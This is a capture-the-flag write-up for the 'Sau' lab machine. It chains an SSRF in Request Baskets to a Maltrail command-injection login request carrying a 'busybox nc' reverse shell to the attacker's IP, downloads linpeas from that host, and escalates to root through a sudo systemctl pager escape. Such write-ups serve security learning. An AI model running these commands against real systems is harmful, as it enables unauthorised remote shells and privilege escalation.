## Description
`Sau` is an Easy Difficulty Linux machine that features a `Request Baskets` instance that is vulnerable to Server-Side Request Forgery (SSRF) via [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163). Leveraging the vulnerability we are to gain access to a `Maltrail` instance that is vulnerable to Unauthenticated OS Command Injection, which allows us to gain a reverse shell on the machine as `puma`. A `sudo` misconfiguration is then exploited to gain a `root` shell.
## Information gathering
Let's start by a full nmap scan:
```
$nmap -p- 10.129.229.26 -oN nmap_full -v
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-28 16:26 CEST
Initiating Ping Scan at 16:26
Scanning 10.129.229.26 [2 ports]
Completed Ping Scan at 16:26, 0.02s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:26
Completed Parallel DNS resolution of 1 host. at 16:26, 0.01s elapsed
Initiating Connect Scan at 16:26
Scanning 10.129.229.26 [65535 ports]
Discovered open port 22/tcp on 10.129.229.26
Discovered open port 55555/tcp on 10.129.229.26
Completed Connect Scan at 16:26, 10.22s elapsed (65535 total ports)
Nmap scan report for 10.129.229.26
Host is up (0.019s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.36 seconds
```
We can see two ports are filtered, let's try to know why:
```
$nmap -p80,8338 10.129.229.26 -oN nmap_why_filtered -v --reason
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-28 16:28 CEST
Initiating Ping Scan at 16:28
Scanning 10.129.229.26 [2 ports]
Completed Ping Scan at 16:28, 0.02s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:28
Completed Parallel DNS resolution of 1 host. at 16:28, 0.01s elapsed
Initiating Connect Scan at 16:28
Scanning 10.129.229.26 [2 ports]
Completed Connect Scan at 16:28, 1.20s elapsed (2 total ports)
Nmap scan report for 10.129.229.26
Host is up, received conn-refused (0.020s latency).

PORT     STATE    SERVICE REASON
80/tcp   filtered http    no-response
8338/tcp filtered unknown no-response

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.27 seconds
```
We get no response for these two ports. It is possible that a firewall prevents access to these services.
Let's look at the two other open ports:
```
$sudo nmap -p22,55555 10.129.229.26 -sV -sC -v 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-28 16:34 CEST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 16:34
Completed NSE at 16:34, 0.00s elapsed
Initiating NSE at 16:34
Completed NSE at 16:34, 0.00s elapsed
Initiating NSE at 16:34
Completed NSE at 16:34, 0.00s elapsed
Initiating Ping Scan at 16:34
Scanning 10.129.229.26 [4 ports]
Completed Ping Scan at 16:34, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:34
Completed Parallel DNS resolution of 1 host. at 16:34, 0.01s elapsed
Initiating SYN Stealth Scan at 16:34
Scanning 10.129.229.26 [2 ports]
Discovered open port 22/tcp on 10.129.229.26
Discovered open port 55555/tcp on 10.129.229.26
Completed SYN Stealth Scan at 16:34, 0.05s elapsed (2 total ports)
Initiating Service scan at 16:34
Scanning 2 services on 10.129.229.26
Completed Service scan at 16:36, 87.02s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.229.26.
Initiating NSE at 16:36
Completed NSE at 16:36, 0.64s elapsed
Initiating NSE at 16:36
Completed NSE at 16:36, 1.04s elapsed
Initiating NSE at 16:36
Completed NSE at 16:36, 0.00s elapsed
Nmap scan report for 10.129.229.26
Host is up (0.020s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa8867d7133d083a8ace9dc4ddf3e1ed (RSA)
|   256 ec2eb105872a0c7db149876495dc8a21 (ECDSA)
|_  256 b30c47fba2f212ccce0b58820e504336 (ED25519)
55555/tcp open  unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sat, 28 Oct 2023 14:35:25 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Sat, 28 Oct 2023 14:34:59 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Sat, 28 Oct 2023 14:34:59 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.93%I=7%D=10/28%Time=653D1C11%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/html;
SF:\x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Sat,\x2028\x20Oct\x2
SF:02023\x2014:34:59\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=\"/
SF:web\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20R
SF:equest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\
SF:x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\x20
SF:200\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Sat,\x2028\x20Oct\x2
SF:02023\x2014:34:59\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPReques
SF:t,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain
SF:;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request
SF:")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:ntent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n
SF:\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400
SF:\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n
SF:Connection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20
SF:charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(
SF:Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
SF:Request")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\
SF:nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Option
SF:s:\x20nosniff\r\nDate:\x20Sat,\x2028\x20Oct\x202023\x2014:35:25\x20GMT\
SF:r\nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20name;\x20the\x20na
SF:me\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\\-_\\\.\]{1,250}\$
SF:\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type
SF::\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x2
SF:0Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Reques
SF:t\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20cl
SF:ose\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 16:36
Completed NSE at 16:36, 0.00s elapsed
Initiating NSE at 16:36
Completed NSE at 16:36, 0.00s elapsed
Initiating NSE at 16:36
Completed NSE at 16:36, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.35 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
```
The server is running on Ubuntu. There is an SSH server on port 22 and an unknown service on port 55555. However, we can see it answer to some HTTP requests.
By browsing this site through a web browser, we can see it is a [`request-baskets`](https://github.com/darklynx/request-baskets) server. The version of the server is 1.2.1.
Request Baskets provides a proxy feature that can be used to get access to the filtered ports we saw earlier. After creating a new basket, I can configure it to forward to `http://localhost/`. Then, when I try to connect using a browser to this new basket, I have a `Maltrail` (v0.53) interface. I did the same for port 8338, but I get redirected to the same page. Apparently, port 8338 is used to administrate `Maltrail` which is malicious traffic detection system.
## Vulnerability assessment
Request Baskets is vulnerable to SSRF up to version 1.2.1 (CVE-2023-27163) which is the vulnerability we already exploit to get information in the previous section. If you want to have all the requests to be forwarded through Request Baskets, you need to select the option "Expand Forward Path".
`Maltrail` is [vulnerable](https://huntr.com/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/) to command injection up to version 0.54. If you send a POST request with an OS command, this will be executed by the server.
## Exploitation
We can now link these two vulnerabilities to exploit the server. First, we create a new bucket (let's call it `test`) that redirect to `http://localhost/` and we "Expand Forward Path". Now, if we make a request to `http://10.129.229.26:55555/test`, we get the interface of `Maltrail`:
```
$curl http://10.129.229.26:55555/test
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta http-equiv="Content-Type" content="text/html;charset=utf8">
        <meta name="viewport" content="width=device-width, user-scalable=no">
        <meta name="robots" content="noindex, nofollow">
        <title>Maltrail</title>
        <link rel="stylesheet" type="text/css" href="css/thirdparty.min.css">
        <link rel="stylesheet" type="text/css" href="css/main.css">
        <link rel="stylesheet" type="text/css" href="css/media.css">
        <script type="text/javascript" src="js/errorhandler.js"></script>
        <script type="text/javascript" src="js/thirdparty.min.js"></script>
        <script type="text/javascript" src="js/papaparse.min.js"></script>
    </head>
    <body>
        <div id="header_container" class="header noselect">
            <div id="logo_container">
                <span id="logo"><img src="images/mlogo.png" style="width: 25px">altrail</span>
[...]
```
We can also try to log with a POST request:
```
$curl http://10.129.229.26:55555/test/login --data 'username=toto'
Login failed
```
We can change the username by an OS command. I used [Reverse Shell Generator](https://www.revshells.com/) to craft a reverse shell command. I started by listening connection locally with `nc -lvnp 8000` and I run the following command:
```
$curl http://10.129.229.26:55555/test/login --data 'username=;`busybox nc 10.10.14.59 8000 -e sh`'
```
I get a shell:
```
$nc -lvnp 8000
listening on [any] 8000 ...
connect to [10.10.14.59] from (UNKNOWN) [10.129.229.26] 37770
pwd
/opt/maltrail
```
I can now read the flag:
```
cd /home
ls
puma
cd puma
ls
user.txt
cat user.txt
e[...SNIP...]e
```
## Privilege escalation
We will use `linpeas.sh` to get information about the host. I already downloaded the script. I can set an HTTP server on my host to make it downloadable from the target:
```
$ls
linpeas.sh
$python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```
And from the target:
```
wget http://10.10.14.59:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```
Because it is not very nice to not have a prompt, I upgrade the prompt using Python:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'           
puma@sau:/tmp$
```
In the `linpeas` report, there is something interesting in the sudo and suid section:
```
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```
We can see that a command can be run with sudo and no password. There is a section for the command `systemctl` in [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/#sudo). You can run system command through the `systemctl` because some text is displayed through `less`:
```
puma@sau:/opt/maltrail$ sudo /usr/bin/systemctl status trail.service
sudo /usr/bin/systemctl status trail.service
WARNING: terminal is not fully functional
-  (press RETURN)
● trail.service - Maltrail. Server of malicious traffic detection system
     Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset:>
     Active: active (running) since Sat 2023-10-28 14:23:56 UTC; 1h 47min ago
       Docs: https://github.com/stamparm/maltrail#readme
             https://github.com/stamparm/maltrail/wiki
   Main PID: 879 (python3)
      Tasks: 21 (limit: 4662)
     Memory: 313.2M
     CGroup: /system.slice/trail.service
             ├─  879 /usr/bin/python3 server.py
             ├─ 1365 /bin/sh -c logger -p auth.info -t "maltrail[879]" "Failed >
             ├─ 1366 sh
             ├─ 8722 gpg-agent --homedir /home/puma/.gnupg --use-standard-socke>
             ├─16239 python3 -c import pty; pty.spawn("/bin/bash")
             ├─16240 /bin/bash
             ├─16251 sudo /usr/bin/systemctl
             ├─16253 /bin/sh -c logger -p auth.info -t "maltrail[879]" "Failed >
             ├─16254 sh
             ├─16255 python3 -c import pty; pty.spawn("/bin/bash")
             ├─16256 /bin/bash
             ├─16267 /bin/sh -c logger -p auth.info -t "maltrail[879]" "Failed >
             ├─16268 sh
             ├─16269 python3 -c import pty; pty.spawn("/bin/bash")
lines 1-23!ls
!llss!ls
CHANGELOG     core    maltrail-sensor.service  plugins		 thirdparty
CITATION.cff  docker  maltrail-server.service  requirements.txt  trails
LICENSE       h       maltrail.conf	       sensor.py
README.md     html    misc		       server.py
```
We can see that we can run the `ls` command. Then, I do the same to get the `root.txt` flag:
```
!cat /root/root.txt
a[...]0
```
## Learning from other writeups
### Official writeup
In the official writeup, the sequence is pretty much the same to get a foothold. I just note something interesting to get a nice prompt without using Python:
```
script /dev/null -c bash
# Ctrl + z
stty -raw echo; fg
# Enter (Return) x2
```
### 0xdf writeup
In [0xdf writeup](https://0xdf.gitlab.io/2024/01/06/htb-sau.html), it uses [`feroxbuster`](https://github.com/epi052/feroxbuster) to "enumerate and access resources that are not referenced by the web application, but are still accessible by an attacker." It is not useful in this case, but it is a tool I will definitely put in my toolbox.
## Lessons learned
This box was pretty straightforward for me. It was easy to find the vulnerabilities and to exploit them. This is due to the toolbox I am building from little to little. Indeed, using [Reverse Shell Generator](https://www.revshells.com/) to craft the command to get a reverse shell, and [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/#sudo) to find how to exploit `systemctl` help a lot.